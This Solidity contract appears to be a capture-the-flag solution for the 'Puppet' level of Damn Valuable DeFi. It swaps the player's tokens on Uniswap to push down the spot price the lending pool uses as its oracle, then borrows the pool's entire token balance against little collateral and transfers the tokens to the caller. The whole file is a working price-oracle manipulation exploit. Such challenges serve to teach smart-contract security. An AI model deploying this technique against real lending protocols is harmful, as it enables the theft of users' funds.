// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { PuppetPool } from "./PuppetPool.sol";
import "../DamnValuableToken.sol";


contract HackPuppet {
    PuppetPool pool;
    DamnValuableToken token;
    address uniswap;

    constructor(PuppetPool _pool, DamnValuableToken _token, address _uniswap) {
        pool = _pool;
        token = _token;
        uniswap = _uniswap;
    }

    function hack(uint256 player_token_balance, uint256 pool_token_balance) external payable {
        //pool.borrow{value: address(this).balance}(1000000, address(this));
        //token.transferFrom(tx.origin, address(this), player_token_balance);
        token.approve(uniswap, player_token_balance);
        (bool success,) = uniswap.call(abi.encodeWithSignature(
            "tokenToEthSwapInput(uint256,uint256,uint256)",
            player_token_balance,
            1,
            block.timestamp * 2
        ));
        require(success, "fallo en tokenToEthSwapInput()");
        pool.borrow{value: address(this).balance}(pool_token_balance, address(this));
        token.transfer(tx.origin, token.balanceOf(address(this)));
    }

    receive() external payable {}
}